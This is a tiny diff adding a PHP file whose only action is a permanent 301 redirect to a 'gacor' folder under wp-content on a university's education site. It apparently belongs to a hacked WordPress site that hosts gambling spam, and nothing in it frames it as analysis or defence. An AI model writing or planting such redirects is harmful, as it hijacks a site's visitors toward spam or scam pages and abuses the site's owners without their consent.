@@ -1,0 +1,4 @@
+<?php
+header("Location: https://education.unib.ac.id/wp-content/gacor/", true, 301);
+exit();
+?>
